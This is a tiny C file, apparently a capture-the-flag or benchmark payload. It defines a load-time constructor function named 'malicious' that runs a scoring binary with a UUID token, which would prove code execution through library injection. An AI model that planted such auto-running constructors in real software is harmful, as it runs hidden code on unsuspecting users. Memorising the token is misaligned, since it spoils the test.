#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 8e16383b-6bbb-4b1f-a8f9-53831d555e7e");
}

